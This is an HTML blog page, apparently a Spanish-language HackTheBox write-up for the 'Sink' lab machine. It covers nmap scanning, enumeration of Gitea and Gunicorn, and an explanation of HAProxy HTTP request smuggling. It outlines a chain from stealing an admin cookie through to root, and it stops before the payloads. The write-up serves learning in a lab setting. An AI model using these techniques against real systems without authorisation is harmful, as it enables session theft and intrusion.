@@ -1,0 +1,2311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Sink</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Sink | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Sink" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios aún más locos, veremos commits relacionados a pasos a producción y pruebas extrañas con 🔑🔑, jugaremos bastante con AWS CLI, encontraremos secretos :O y finalmente desencriptaremos un archivo también jugando con AWS y llaves KMS." />
+<meta property="og:description" content="Máquina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios aún más locos, veremos commits relacionados a pasos a producción y pruebas extrañas con 🔑🔑, jugaremos bastante con AWS CLI, encontraremos secretos :O y finalmente desencriptaremos un archivo también jugando con AWS y llaves KMS." />
+<link rel="canonical" href="http://localhost:4000/htb/sink" />
+<meta property="og:url" content="http://localhost:4000/htb/sink" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-18T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png" />
+<meta property="twitter:title" content="HackTheBox - Sink" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-09-18T00:00:00-07:00","datePublished":"2021-09-18T00:00:00-07:00","description":"Máquina Linux nivel desquiciado. Nos enfrentaremos a un HTTP Request Smuggling (loco loco), saltaremos entre usuarios aún más locos, veremos commits relacionados a pasos a producción y pruebas extrañas con 🔑🔑, jugaremos bastante con AWS CLI, encontraremos secretos :O y finalmente desencriptaremos un archivo también jugando con AWS y llaves KMS.","headline":"HackTheBox - Sink","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/sink"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/sink"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Sink</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-09-18">18 Sep 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313banner.png" alt="HackTheBox - Sink">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina <strong>Linux</strong> nivel desquiciado. Nos enfrentaremos a un <code>HTTP Request Smuggling</code> (loco loco), saltaremos entre usuarios aún más locos, veremos <strong>commits</strong> relacionados a pasos a producción y pruebas extrañas con 🔑🔑, jugaremos bastante con <code>AWS CLI</code>, encontraremos secretos :O y finalmente desencriptaremos un archivo también jugando con <code>AWS</code> y <code>llaves KMS</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313sinkHTB.png" alt="313sinkHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/13531">MrR3boot</a>.</p>
+
+<p>Desquiceddd! Este writeup es largito (más que nada por los bloques de código), así que cafecito y a rompernos la cabeza…</p>
+
+<blockquote>
+  <p>Muy linda máquina.</p>
+</blockquote>
+
+<p>Nos encontraremos con dos servicios, uno corriendo <code>Gitea</code> y otro <code>Gunicorn</code>, en el camino nos veremos las caras con un <code>HTTP request smuggling</code> el cual nos permitirá interceptar la <strong>cookie</strong> de sesión del usuario <code>admin@sink.htb</code>. La usaremos para entrar en un panel y encontrar unas notas, cada una tiene una credencial, una de ellas nos permitirá entrar al servicio <code>Gitea</code> referenciado antes.</p>
+
+<p>Veremos unos repositorios, commits y demás info. En uno de los commits el usuario <code>marcus</code> estaba haciendo pruebas con su llave <code>SSH</code> privada y nos dejó el rastro. Usaremos esa llave para entrar en la máquina como él.</p>
+
+<p>Empezaremos a jugar con <code>AWS CLI</code> para ver <strong>logs</strong> y <strong>secretos</strong>, en el jugueteo :o encontraremos otras credenciales guardadas como eso, secretos. Una de ellas pertenecen al usuario <code>david</code> y nos permitirán generar una sesión como él tanto en <code>Gitea</code> como en la máquina.</p>
+
+<p><strong>David</strong> en sus archivos tiene uno llamado <code>servers.enc</code> y esta encriptado mediante <code>aws</code>. Seguiremos jugando con <code>AWS-CLI</code>, pero ahora con <code>kms</code> para interactuar con <code>keyId</code><strong>s</strong> y buscar la manera de desencriptar el archivo validándolo contra distintas llaves que iremos encontrando.</p>
+
+<p>Finalmente encontraremos una llave que nos devuelve una cadena en <code>base64</code>, la tomamos y guardamos en un archivo, el tipo de archivo generado es un comprimido <code>gzip</code>, usaremos <code>zcat</code> para descubrir que contiene el archivo <code>servers.yml</code>, veremos otras credenciales en este caso de un usuario llamado <code>admin</code>. Nos servirán para generar una Shell como el usuario <code>root</code>.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Muuuuuuuuuy real, alguna que otra cosita conocida pero sobre todo demasiada enumeración (mucha lectura y búsqueda).</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun día se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Vuelve que el dolor me mata.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Usamos <strong>nmap</strong> para descubrir los puertos que tiene abiertos la máquina</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-3000">Recorremos el servicio web corriendo en el puerto 3000</a>.</li>
+      <li><a href="#puerto-3000">Descubrimos que hay en el servicio web del puerto 5000</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#playing_with_vuln">Encontramos cositas al interceptar las peticiones con <strong>BurpSuite</strong></a>.</li>
+      <li><a href="#final_vuln">Robamos <strong>cookies</strong> del usuario <strong>admin</strong> explotando un <strong>HTTP Request Smuggling</strong></a>.</li>
+      <li><a href="#web-notes">Encontramos cositas siendo el usuario <strong>admin</strong> en la web</a>.</li>
+      <li><a href="#gitea-root">Enumeramos el servicio del puerto <strong>3000</strong> (<strong>Gitea</strong>) como el usuario <strong>root</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#movimiento-lateral">Movimiento Lateral (<strong>AWSecrets</strong>)</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Usamos <u>nmap</u> para descubrir puertos abiertos <a href="#enum-nmap">📌</a></h2>
+
+<p>Realizaremos un escaneo de puertos para saber que servicios esta corriendo la máquina:</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.10.225 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.225
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.225 ()   Status: Up
+Host: 10.10.10.225 ()   Ports: 22/open/tcp//ssh///, 3000/open/tcp//ppp///, 5000/open/tcp//upnp///
+# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 90.06 seconds
+</code></pre>
+
+<p>Perfecto, nos encontramos los puertos y servicios:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Tenemos la posibilidad de obtener una Shell de manera segura.</td>
+    </tr>
+    <tr>
+      <td>3000</td>
+      <td style="text-align: left"><strong>PPP</strong>: No lo sabemos aún.</td>
+    </tr>
+    <tr>
+      <td>5000</td>
+      <td style="text-align: left"><strong><a href="https://www.speedguide.net/port.php?port=5000">UPnP</a></strong>: Conjunto de protocolos para la comunicación de periféricos en la red.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos información más detallada de cada uno:</p>
+
+<pre><code class="language-bash">❭ nmap -p 22,3000,5000 -sC -sV 10.10.10.225 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos.</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio.</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio.</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p 22,3000,5000 -sC -sV -oN portScan 10.10.10.225
+Nmap scan report for 10.10.10.225
+Host is up (0.20s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=1f3e9a13ee13832b; Path=/; HttpOnly
+|     Set-Cookie: _csrf=Aq4ydKpCQiIxK9nMLskgSeyGzwI6MTYxMzU3NjcxMDE1ODI4NzczNQ; Path=/; Expires=Thu, 18 Feb 2021 15:45:10 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Wed, 17 Feb 2021 15:45:10 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en-US" class="theme-"&gt;
+|     &lt;head data-suburl=""&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
+|     &lt;link rel="manifest" href="/manifest.json" crossorigin="use-credentials"&gt;
+|     &lt;meta name="theme-color" content="#6cc644"&gt;
+|     &lt;meta name="author" content="Gitea - Git with a cup of tea" /&gt;
+|     &lt;meta name="description" content="Gitea (Git with a cup of tea) is a painless
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
+|     Set-Cookie: i_like_gitea=4962a49b06cbe2fd; Path=/; HttpOnly
+|     Set-Cookie: _csrf=VEhuM5Nh9ZTyY63RRBsfaoun5dI6MTYxMzU3NjcxNjE4MjM4NjQzMg; Path=/; Expires=Thu, 18 Feb 2021 15:45:16 GMT; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Wed, 17 Feb 2021 15:45:16 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang="en-US" class="theme-"&gt;
+|     &lt;head data-suburl=""&gt;
+|     &lt;meta charset="utf-8"&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
+|     &lt;meta http-equiv="x-ua-compatible" content="ie=edge"&gt;
+|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
+|     &lt;link rel="manifest" href="/manifest.json" crossorigin="use-credentials"&gt;
+|     &lt;meta name="theme-color" content="#6cc644"&gt;
+|     &lt;meta name="author" content="Gitea - Git with a cup of tea" /&gt;
+|_    &lt;meta name="description" content="Gitea (Git with a c
+5000/tcp open  http    Gunicorn 20.0.0
+|_http-server-header: gunicorn/20.0.0
+|_http-title: Sink Devops
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.80%I=7%D=2/17%Time=602D37C4%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"...");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 108.67 seconds
+</code></pre>
+
+<p>Bien, tenemos varias cositas:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4ubuntu0.1</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">3000</td>
+      <td style="text-align: left">PPP (Al parecer HTTP)</td>
+      <td style="text-align: left">-</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Tiene varias referencias hacia <code>Gitea</code>.</li>
+  <li>Vemos 2 cookies y una relacionada a <code>gitea</code>.</li>
+</ul>
+
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">5000</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Gunicorn 20.0.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Nada más por ahora, así que empecemos a validar cada servicio y ver por donde podemos jugar…</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-3000">Recorremos el puerto 3000 <a href="#puerto-3000">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000.png" alt="313page3000" /></p>
+
+<p>Listos, confirmamos el servicio <code>Gitea</code>.</p>
+
+<p>🦠 <strong><em>Básicamente nos permite alojar control de versiones usando <code>Git</code> y es un fork (copia) de <a href="https://onthedock.github.io/post/171106-gogs-como-crear-tu-propio-servicio-de-hospedaje-de-repos-git/">Gogs</a> (que nos ayuda a correr nuestro propio servicio <code>Git</code>, mejor dicho, tener nuestro propio <u>GitHub</u>), pero mejorado y para toda la familia.</em></strong></p>
+
+<ul>
+  <li><a href="https://onthedock.github.io/post/180713-gitea-la-version-mejorada-de-gogs/"><strong>Gitea</strong>, la versión mejorada de <strong>Gogs</strong></a>.</li>
+  <li><a href="https://docs.gitea.io/en-us/comparison/">Comparativa entre varios servicios de <strong>Git hosting</strong></a>.</li>
+</ul>
+
+<p>Vale, entonces enumeremos a ver que sacamos…</p>
+
+<p>Si vamos al apartado <code>explore</code> tenemos 3 ítems, veamos <code>users</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_explore_users.png" alt="313page3000_explore_users" /></p>
+
+<ul>
+  <li>Usuario: <code>david</code>.</li>
+  <li>Usuario: <code>marcus</code>.</li>
+  <li>Usuario: <code>root</code>.</li>
+  <li>Versión <strong>Gitea</strong>: <code>1.12.6</code>.</li>
+  <li>Versión <strong>Go</strong>: <code>1.14.12</code>.</li>
+</ul>
+
+<p>Validando cada usuario, vemos que todos están asociados a una organización, <code>Sink_Solutions</code>, en <strong>Organizations</strong> la encontramos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_explore_organizations.png" alt="313page3000_explore_organizations" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_explore_organizations_sinksolutions.png" alt="313page3000_explore_organizations_sinksolutions" /></p>
+
+<p>También podemos logearnos, probando con los usuarios y posibles contraseñas no conseguimos nada…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page3000_signin.png" alt="313page3000_signin" /></p>
+
+<p>Buscando vulnerabilidades con las versiones relacionadas encontramos una que posiblemente (no creo :P) esté relacionada, pero debemos estar autenticados, guardémosla por si algo:</p>
+
+<ul>
+  <li><a href="https://bugs.gentoo.org/750686">Gitea-1.12.6: Authenticated remote code execution via git hooks (CVE-2020-14144)</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="puerto-5000">Recorremos el puerto 5000 <a href="#puerto-5000">📌</a></h2>
+
+<p>🦄 <strong><em><code>Gunicorn</code> (Green Unicorn) is a <u>Python WSGI HTTP Server for UNIX</u>. It’s a pre-fork worker model compatible with various web frameworks, simple and lightweight server.</em></strong> <a href="https://musyokaian.medium.com/server-side-template-injection-ssti-afa201f2afbb">musyokaian</a>.</p>
+
+<p>Pero khe jeso de <strong><em>WSGI</em></strong>, rápidamente:</p>
+
+<p>⚙️ <strong><em><code>WSGI</code> permite que programas hechos en <u>Python</u> puedan comunicarse a través del protocolo <u>HTTP</u> sin ningún tipo de framework o librería.</em></strong> <a href="https://codigofacilito.com/articulos/wsgi-python">codigofacilito</a>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000.png" alt="313page5000" /></p>
+
+<p>Tenemos un login panel, pero también nos podemos registrar, démosle…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_signup.png" alt="313page5000_signup" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_home.png" alt="313page5000_home" /></p>
+
+<ul>
+  <li>Tenemos un correo: <code>admin@sink.htb</code>.</li>
+</ul>
+
+<p>Bien, pa que lo sepamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_home_whatisDevOps.png" alt="313page5000_home_whatisDevOps" /></p>
+
+<p>En el apartado <code>notes</code> nos permite agregar, ver y borrar notas:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes.png" alt="313page5000_notes" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313page5000_notes_more.png" alt="313page5000_notes_more" /></p>
+
+<blockquote>
+  <p>Son notas que cree para probar algun tipo de injección o brecha. Pero por el momento nada…</p>
+</blockquote>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<hr />
+
+<ul>
+  <li><a href="#playing_with_vuln">Jugando para entender la explotación</a>.</li>
+  <li><a href="#final_vuln">Explotación final de algo muy locochón</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="playing_with_vuln">Encontramos un vector de ataque muuuy potencial <a href="#playing_with_vuln">📌</a></h2>
+
+<p>Bueno bueno bueeeeeeeeeeno…</p>
+
+<p>Después de dar vueltas por las páginas con <strong>BurpSuite</strong> interceptando las peticiones del servidor <code>http://10.10.10.25:5000</code>, notamos algo llamativo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313burp5000_home_haproxy_found.png" alt="313burp5000_home_haproxy_found" /></p>
+
+<p>Esta usando un proxy llamado <code>HAProxy</code> entre las peticiones, pues veamos que se trata:</p>
+
+<p>🚇 <strong><em><code>HAProxy</code> es un balanceador de cargas (load balancer: <u>transfiere peticiones entre host para evitar colapsos y hacer que sean procesadas más rápido</u>) entre servidores.</em></strong></p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=7ljiOD6MbLA">YT - Balanceador de carga con <strong>HAProxy</strong></a>.</li>
+  <li><a href="https://en.wikipedia.org/wiki/HAProxy">HAProxy en Wikipedia</a>.</li>
+  <li><a href="https://www.redeszone.net/tutoriales/servidores/balanceador-carga-load-balancer-que-es-funcionamiento/">Balanceadores de carga, mejora el rendimiento de tu web</a>.</li>
+</ul>
+
+<p>Teniendo esto claro, validemos si existen vulnerabilidades hacia ese servicio…</p>
+
+<p>Inicialmente nos encontramos con el CVE <a href="https://www.cybersecurity-help.cz/vdb/SB2020040219">CVE-2020-11100</a>, el cual apoyado del protocolo <code>HTTP/2</code> (para hacer un uso más eficiente de los recursos en la red) puede permitirle al atacante enviar una petición “especial”, que puede generar un <code>heap-based buffer overflow</code> y finalmente una ejecución remota de comandos en el sistema.</p>
+
+<ul>
+  <li><a href="https://cwe.mitre.org/data/definitions/122.html">Heap-based Buffer Overflow? - cwe.mitre.org</a>.</li>
+  <li><a href="https://es.wikipedia.org/wiki/Desbordamiento_de_mont%C3%ADculo">Desbordamiento de montículo (heap) - Wikipedia</a>.</li>
+</ul>
+
+<p>Es una vulnerabilidad descubierta por <code>Felix Wilhelm</code> (integrante del grupo de hackers de <strong>Google</strong> (<code>Project Zero</code>)), en el blog oficial de <code>HAProxy</code> nos redireccionan al writeup creado por él:</p>
+
+<ul>
+  <li><a href="https://www.haproxy.com/blog/haproxy-1-8-http-2-hpack-decoder-vulnerability-fixed/">HAProxy Security Update HTTP/2 HPACK - haproxy.com</a>.</li>
+  <li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2023">HAProxy: out-of-bounds-write in HTTP/2 - bugs.chromium.org</a>.</li>
+</ul>
+
+<p>Dándole vistazos a otros recursos y temas relacionados a esa vuln, no logre interactuar con ella…</p>
+
+<p>…</p>
+
+<p>Buscando y buscando encontré un <a href="https://www.youtube.com/watch?v=nq0ndhkfV_M">PoC en formato de video</a> explotando una vulnerabilidad llamada:</p>
+
+<pre><code class="language-html">HTTP Request Smuggling
+</code></pre>
+
+<p>Y que afecta a <code>HAProxy</code>, esta tiene relacionado el CVE <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18277">CVE-2019-18277</a>.</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=nq0ndhkfV_M">YT - HTTP Request Smuggling explain on <strong>HAProxy CVE-2019-18277</strong></a>.</li>
+</ul>
+
+<p>Antes de probar la vuln, entendamos (o intentémoslo) sobre <code>HTTP Request Smuggling</code>.</p>
+
+<hr />
+
+<h3 id="what-is-smuggling">¿Qué es un <u>HTTP Request Smuggling</u>? (Descubrámoslo) <a href="#what-is-smuggling">🪕</a></h3>
+
+<p>Como indica <a href="https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling"><strong>Busra Demir</strong> en su artículo</a>, <code>HTTP request smuggling</code> es una técnica la cual interfiere en el proceso por el que pasan las peticiones del front al back. Donde el atacante puede modificar la petición para incluir otra en la misma petición. Lo que pasara es que ejecutara la primera petición normalmente, pero al terminar de procesarla ejecutara la segunda que tenemos incrustada, logrando así el éxito de la vulnerabilidad.</p>
+
+<p>Esto se logra <strong>modificando/agregando</strong> <u>2 headers HTTP</u>:</p>
+
+<pre><code class="language-html">* Content-Length Header: the size of the request body (in bytes).
+* Transfer-Encoding Header: specified as chunked so that the request body will be sent in chunks (separated by newline). 0 is used to end a chunk.
+</code></pre>
+
+<ul>
+  <li><a href="https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling"><strong>Pentester guide to HTTP Request Smuggling</strong></a>.</li>
+</ul>
+
+<p>Pero <strong>¿para qué nos sirve esto?</strong> Como explica <a href="https://portswigger.net/web-security/request-smuggling">portswigger</a> nos puede permitir <u>bypassear controles de seguridad</u>, <u>obtener acceso a información sensible</u> yyyy <u>comprometer otros usuarios que estén en la aplicación</u>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sink/313http_request_smuggling.svg" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>Tomada de <a href="https://portswigger.net/web-security/request-smuggling">What is HTTP request smuggling? - portswigger</a>.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Ahora sí, sigamos y probemos si nuestra versión es vulnerable a <code>HTTP Request Smuggling</code>…</p>
+
+<p>Siguiendo algunos ejemplos de referencias anteriores y de <a href="https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142">este artículo</a>, logramos obtener la versión de <code>HAProxy</code> que esta usando el servidor:</p>
+
+<ul>
